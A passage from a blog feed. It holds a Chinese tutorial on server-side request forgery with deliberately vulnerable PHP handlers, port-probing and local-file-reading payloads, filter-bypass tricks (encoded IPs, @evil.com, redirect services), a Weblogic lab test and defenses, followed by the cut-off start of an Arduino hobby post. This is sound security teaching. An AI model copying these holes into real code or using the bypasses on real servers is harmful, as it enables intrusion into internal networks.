        <content type="html"><![CDATA[<h1 id="SSRF概念"><a href="#SSRF概念" class="headerlink" title="SSRF概念"></a>SSRF概念</h1><p>SSRF（Server-Side Request Forgery:服务器端请求伪造）是一种由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。正是因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF的攻击目标是攻击者无法直接访问的内网系统。</p><h1 id="SSRF的原理"><a href="#SSRF的原理" class="headerlink" title="SSRF的原理"></a>SSRF的原理</h1><p>SSRF漏洞的形成大多是由于服务端提供了从其他服务器应用获取数据的功能而没有对目标地址做过滤和限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等，利用的就是服务端请求伪造，SSRF漏洞可以利用存在缺陷的WEB应用作为代理攻击远程和本地的服务器。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/640"></p><h1 id="SSRF的危害"><a href="#SSRF的危害" class="headerlink" title="SSRF的危害"></a>SSRF的危害</h1><blockquote><ol><li>对外网、服务器所在内网、服务器本地进行端口扫描，获取一些服务的banner信息等。</li><li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等。</li><li>对内网Web应用进行指纹识别，识别企业内部的资产信息。</li><li>攻击内外网的Web应用，主要是使用HTTP GET/POST请求就可以实现的攻击，如sql注入、文件上传等。</li><li>利用file协议读取服务器本地文件等。</li><li>进行跳板攻击等。</li></ol></blockquote><h1 id="SSRF测试代码"><a href="#SSRF测试代码" class="headerlink" title="SSRF测试代码"></a>SSRF测试代码</h1><p>SSRF漏洞相关函数</p><blockquote><p><em>file_get_contents()</em> 将整个文件或一个url所指向的文件读入一个字符串中。</p><p><em>readfile()</em> 输出一个文件的内容。</p><p><em>fsockopen()</em> 打开一个网络连接或者一个Unix 套接字连接。</p><p>curl_exec() 执行一个cURL会话,成功返回true，失败返回false。</p><p><em>curl_setopt</em>() 函数将为一个CURL会话设置选项。option参数是你想要的设置,value是这个选项给定的值。</p></blockquote><ol><li><code>file_get_contents()</code>测试代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述测试代码中，<code>file_get_contents()</code> 函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造好paylaod即可读取服务器本地的任意文件。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401184537457.png" alt="image-20210401184537457"></p><p>也可以进行远程访问：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401184635097.png" alt="image-20210401184635097"></p><p>readfile()函数与filegetcontents()函数相似。</p><ol start="2"><li><code>fsockopen() </code>测试代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line">    <span class="keyword">while</span> (!feof(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code> 用于打开一个网络连接或者一个Unix 套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其他文件类函数调用（例如：fgets()，fgetss()，fwrite()，fclose()还有feof()）。如果调用失败，将返回false。</p><p>构造 <code>ssrf.php?url=www.baidu.com</code> 即可成功触发ssrf并返回百度主页：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401185335370.png" alt="image-20210401185335370"></p><p>但是该函数的SSRF无法读取本地文件。</p><ol start="3"><li><code>curl_exec() </code> 测试代码：</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL ^ E_NOTICE);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$ch</span> = curl_init();<span class="comment">//初始化curl会话</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);<span class="comment">//指定请求的url</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">0</span>);<span class="comment">// 启用时会将头文件的信息作为数据流输出。参数为1表示输出信息头,为0表示不输出</span></span><br><span class="line">curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此页面的功能是获取URL参数，然后将URL的内容显示到网页页面上。</p><p>利用上面编写好的SSRF漏洞来测试一下：</p><ul><li>探测一下本地是否存在mysql服务器</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331214657070.png" alt="image-20210331214657070"></p><p>出现mysql相关的提示，说明这个服务器上存在mysql。</p><blockquote><p>Tips：如果对url后缀有限制则可以用<code>?</code>或者<code>#</code>绕过，如<code>http://localhost/ssrf/ssrf.php?url=127.0.0.1:3306/?.jpg</code></p></blockquote><ul><li>伪造请求访问百度(用服务器做跳板访问别的网站)</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331215034000.png" alt="image-20210331215034000"></p><ul><li>伪造请求探测服务器开放的端口</li></ul><p>和第一点相同，更改不同的端口号进行遍历来判断端口是否开放。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331215235270.png" alt="image-20210331215235270"></p><ul><li>伪造请求读取服务器(内网)敏感资料</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210331220047359.png" alt="image-20210331220047359"></p><h1 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h1><p>漏洞测试靶场：<strong>vulhub之Weblogic SSRF漏洞</strong></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220238584.png" alt="image-20210401220238584"></p><p>SSRF漏洞存在于<a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp%EF%BC%8C%E6%88%91%E4%BB%AC%E5%9C%A8brupsuite%E4%B8%8B%E6%B5%8B%E8%AF%95%E8%AF%A5%E6%BC%8F%E6%B4%9E%E3%80%82%E8%AE%BF%E9%97%AE%E4%B8%80%E4%B8%AA%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E7%9A%84IP:PORT%EF%BC%8C%E5%A6%82http://127.0.0.1:7001%EF%BC%9A">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如http://127.0.0.1:7001：</a></p><p>可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220537141.png" alt="image-20210401220537141"></p><p>修改为一个不存在的端口，将会返回could not connect over HTTP to server。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401220649022.png" alt="image-20210401220649022"></p><p>通过错误的不同，即可探测内网状态。</p><h1 id="SSRF漏洞常见挖掘方法"><a href="#SSRF漏洞常见挖掘方法" class="headerlink" title="SSRF漏洞常见挖掘方法"></a>SSRF漏洞常见挖掘方法</h1><h2 id="SSRF涉及的协议"><a href="#SSRF涉及的协议" class="headerlink" title="SSRF涉及的协议"></a>SSRF涉及的协议</h2><ul><li>file协议：在有回显的情况下，利用 file 协议可以读取任意文件的内容</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401224611290.png" alt="image-20210401224611290"></p><ul><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li></ul><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401224503411.png" alt="image-20210401224503411"></p><ul><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)，可用于反弹shell</li><li>http/s协议：探测内网主机存活</li></ul><h2 id="SSRF常见的种类"><a href="#SSRF常见的种类" class="headerlink" title="SSRF常见的种类"></a>SSRF常见的种类</h2><ol><li>远程下载SSRF：可以直接操纵服务器远程下载其他服务器的资源，这种可以完全回显所有信息，危害最大。</li><li>布尔型SSRF：不会回显被攻击的内网信息，是提示true和false，这种对攻击者提供的信息较少，一般只能探测和盲打，利用率不高。</li><li>无回显SSRF：不回显任何信息的SSRF。只能通过dnslog判断ssrf是否存在，无法用来探测内网，只能配合其他信息泄露来盲打内网。单独存在没有危害。</li></ol><h2 id="SSRF通常可能存在的地方"><a href="#SSRF通常可能存在的地方" class="headerlink" title="SSRF通常可能存在的地方"></a>SSRF通常可能存在的地方</h2><ol><li><p>社交分享功能：获取超链接的标题等内容进行显示</p></li><li><p>转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</p></li><li><p>在线翻译：给网址翻译对应网页的内容</p></li><li><p>图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</p></li><li><p>图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</p></li><li><p>云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</p></li><li><p>网站采集、网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</p></li><li><p>数据库内置功能：数据库的比如mongodb的copyDatabase函数</p></li><li><p>邮件系统：比如接收邮件服务器地址</p></li><li><p>编码处理、属性信息处理、文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</p></li><li><p>未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</p><p>一些的url中的关键字：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain……</p></li><li><p>从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</p></li></ol><h2 id="SSRF漏洞验证方法"><a href="#SSRF漏洞验证方法" class="headerlink" title="SSRF漏洞验证方法"></a>SSRF漏洞验证方法</h2><ol><li>排除法：浏览器f12查看源代码看是否是在本地进行了请求</li></ol><p>比如：该资源地址类型为 <a href="http://www.xxx.com/a.php?image=%EF%BC%88%E5%9C%B0%E5%9D%80%EF%BC%89%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8SSRF%E6%BC%8F%E6%B4%9E">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><ol start="2"><li>dnslog等工具进行测试，看是否被访问</li></ol><p>–可以在盲打后台用例中将当前准备请求的uri 和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求。</p><ol start="3"><li>抓包分析发送的请求是不是由服务器的发送的，如果不是客户端发出的请求，则有可能是，接着找存在HTTP服务的内网地址</li></ol><p>–从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>–通过二级域名暴力猜解工具模糊猜测内网地址</p><ol start="4"><li>直接返回的Banner、title、content等信息</li><li>留意bool型SSRF</li></ol><h2 id="SSRF绕过姿势"><a href="#SSRF绕过姿势" class="headerlink" title="SSRF绕过姿势"></a>SSRF绕过姿势</h2><blockquote><p>更多见 <a href="https://www.secpulse.com/archives/65832.html">SSRF绕过方法总结</a> 、参考资料[3]</p></blockquote><ol><li><p>进制的转换绕过内网IP</p><p>可以使用一些不同的进制替代ip地址，从而绕过WAF。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">例如 127.0.0.1</span><br><span class="line">8进制：0177.0.0.1</span><br><span class="line">16进制：0x7f.0.0.1</span><br><span class="line">10进制：2130706433</span><br></pre></td></tr></table></figure><p>其他各种指向127.0.0.1的地址</p><blockquote><p><a href="http://localhost/">http://localhost/</a>         # localhost就是代指127.0.0.1</p><p><a href="http://0.0.0.0/">http://0/</a>                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1</p><p><a href="http://0.0.0.0/">http://0.0.0.0/</a>       # 0.0.0.0这个IP地址表示整个网络，可以代表本机 ipv4 的所有地址http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行</p><p>http://[::]:80/           # 在liunx下可用，window测试了下不行</p><p><a href="http://127.0.0.1/">http://127。0。0。1/</a>       # 用中文句号绕过</p><p>http://①②⑦.⓪.⓪.①</p><p><a href="http://127.0.0.1/">http://127.00000.00000.001/</a> # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1</p></blockquote></li><li><p>利用HTTP基本身份认证的方式绕过</p><p>如果目标代码限制访问的域名只能为 <a href="http://www.xxx.com/">http://www.xxx.com</a> ，那么我们可以采用HTTP基本身份认证的方式绕过。即@：<a href="http://www.xxx.com@www.evil.com/">http://www.xxx.com@www.evil.com</a></p></li><li><p>利用302跳转绕过内网IP</p></li></ol><p>（1）网络上存在一个很神奇的服务，网址为 <a href="http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：">http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子：</a></p><p>当我们访问：<a href="http://127.0.0.1.xip.io/flag.php">http://127.0.0.1.xip.io/flag.php</a> 时，实际上访问的是<a href="http://127.0.0.1/1.php">http://127.0.0.1/1.php</a> 。像这种网址还有<a href="http://nip.io,http//sslip.io">http://nip.io，http://sslip.io</a> 。</p><p>如下示例（flag.php仅能从本地访问）：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401203614705.png" alt="image-20210401203614705"></p><p>（2）短地址跳转绕过，这里也给出一个网址 <a href="https://4m.cn/%EF%BC%9A">https://4m.cn/：</a></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401203936903.png" alt="image-20210401203936903"></p><p>直接使用生成的短连接 <a href="https://4m.cn/FjOdQ%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8302%E8%B7%B3%E8%BD%AC%E5%88%B0">https://4m.cn/FjOdQ就会自动302跳转到</a> <a href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a> 上，这样就可以绕过WAF了：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210401204144651.png" alt="image-20210401204144651"></p><h1 id="SSRF漏洞常用防御方法"><a href="#SSRF漏洞常用防御方法" class="headerlink" title="SSRF漏洞常用防御方法"></a>SSRF漏洞常用防御方法</h1><p>通过上面的知道了SSRF漏洞最大的成因是URL完全可控，服务器会对用户构造的URL进行响应，所以从防御方面来看我们要禁止服务器随意响应用户构造的URL。</p><ol><li>过滤。过滤返回的信息，如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</li><li>禁止跳转。防止用户利用服务器做跳板机</li><li>禁止不常用的协议，仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp://等引起的问题。</li><li>限制端口。只开放常用端口</li><li>统一返回的错误信息。这样用户就不可以根据返回信息判断端口情况。</li><li>使用DNS缓存技术防止DNS解析攻击</li><li>使用正则防止畸形绕过</li></ol><h1 id="XSS-CSRF-SSRF异同"><a href="#XSS-CSRF-SSRF异同" class="headerlink" title="XSS,CSRF,SSRF异同"></a>XSS,CSRF,SSRF异同</h1><p>XSS，CSRF,SSRF三种常见的Web服务端漏洞均是由于，服务器端对用户提供的可控数据过于信任或者过滤不严导致的。</p><p>不同点：</p><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>XSS是服务器对用户输入的数据没有进行足够的过滤，导致客户端浏览器在渲染服务器返回的html页面时，出现了预期值之外的 脚本语句被执行。</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>CSRF是服务器端没有对用户提交的数据进行随机值校验，且对http请求包内的refer字段校验不严，导致攻击者可以 利用用户的Cookie信息伪造用户请求发送至服务器。</p></div><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>SSRF是服务器对 用户提供的可控URL过于信任，没有对攻击者提供的RUL进行地址限制和足够的检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p></div><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="https://zhuanlan.zhihu.com/p/91819069">SSRF漏洞攻击原理及防御方案</a></p><p>[2] <a href="https://xz.aliyun.com/t/2115?accounttraceid=941294f62118431d9627281481dc0f3bngye#toc-5">了解SSRF,这一篇就足够了</a></p><p>[3] <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247495875&idx=1&sn=5c25babaff728cc8498dced8f56a5bf1&chksm=ec1ca5fcdb6b2cea98cc125cee654d9d6426dabcc1ab8a6d466b7fc140ae8bfb59d63f473b9b&mpshare=1&scene=23&srcid=0401sfQC8XjENqPmXz5WNZZ8&sharer_sharetime=1617266425319&sharer_shareid=0682904b850da48c54cd507e190afd60#rd">干货 | SSRF漏洞利用总结</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Arduino试玩体验</title>
      <link href="posts/5548.html"/>
      <url>posts/5548.html</url>
      
        <content type="html"><![CDATA[<div class="note info simple"><p>前几天，幸运地得到了学长赠送的一组 Arduino 套件，好学（玩）的我自然是激动万分。于是开始了 Arduino入坑之旅。现就初次学习（试玩）大体情况作如下记录。</p></div><h1 id="Ariuino-套件"><a href="#Ariuino-套件" class="headerlink" title="Ariuino 套件"></a>Ariuino 套件</h1><p>此套件主要包含有 Arduino UNO板子、驱动模块（L298N）、小车套件、杜邦线、面包板、各种传感器等等。（第一次接触这些，已经被我翻得混乱不堪）</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328162824003.png" alt="image-20210328162824003"></p><h1 id="点灯💡"><a href="#点灯💡" class="headerlink" title="点灯💡"></a>点灯💡</h1><p>经过一番学习后，大概了解了这些东西各自的作用。马上开始了第一个（最简单的）尝试，点亮 LED 灯，效果还可以，灯亮了。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328163509247.png" alt="image-20210328163509247"></p><p>实现代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your setup code here, to run once:</span></span><br><span class="line">  <span class="built_in">pinMode</span>(<span class="number">13</span>, <span class="literal">OUTPUT</span>); <span class="comment">//将13号引脚设置为输出状态</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your main code here, to run repeatedly:</span></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">HIGH</span>); <span class="comment">//高电平</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">LOW</span>); <span class="comment">//低电平</span></span><br><span class="line">  <span class="built_in">delay</span>(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="流水灯✨"><a href="#流水灯✨" class="headerlink" title="流水灯✨"></a>流水灯✨</h1><p>第二个做的是流水灯，因为只有6个LED小灯，做得比较简单，6个灯在面包板上依次亮灭，也还可以。还学习到了面包板的使用。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/d_lamp.gif"></p><p>实现代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">8</span>; i &lt;= <span class="number">13</span>; i++)</span><br><span class="line">  <span class="built_in">pinMode</span>(i, <span class="literal">OUTPUT</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">loop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> interval = <span class="number">100</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">8</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">9</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">9</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">12</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">10</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">11</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">12</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">13</span>, <span class="literal">LOW</span>);</span><br><span class="line">  <span class="built_in">digitalWrite</span>(<span class="number">8</span>, <span class="literal">HIGH</span>);</span><br><span class="line">  <span class="built_in">delay</span>(interval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="智能小车🚗"><a href="#智能小车🚗" class="headerlink" title="智能小车🚗"></a>智能小车🚗</h1><p>以前做过的小车是马达加上轮子就能跑了，不过只能是以最大速度直行。可有了uno板后就完全不一样了，它可是有强大的CPU在身，能实现转向、变速、控制、循迹等等更加智能的操作。因为没有相应控制模块，这次的目标是让小车前后左右跑起来就行了。可惜没能成功，太失败了吧。以下是最简陋的小车。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210328170432868.png" alt="image-20210328170432868"></p><p>测试代码：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Servo.h&gt;</span></span></span><br><span class="line"><span class="comment">//定义五中运动状态</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STOP      0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FORWARD   1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BACKWARD  2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TURNLEFT  3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TURNRIGHT 4</span></span><br><span class="line"><span class="comment">//定义需要用到的引脚</span></span><br><span class="line"><span class="keyword">int</span> leftMotor1 = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> leftMotor2 = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> rightMotor1 = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">int</span> rightMotor2 = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// put your 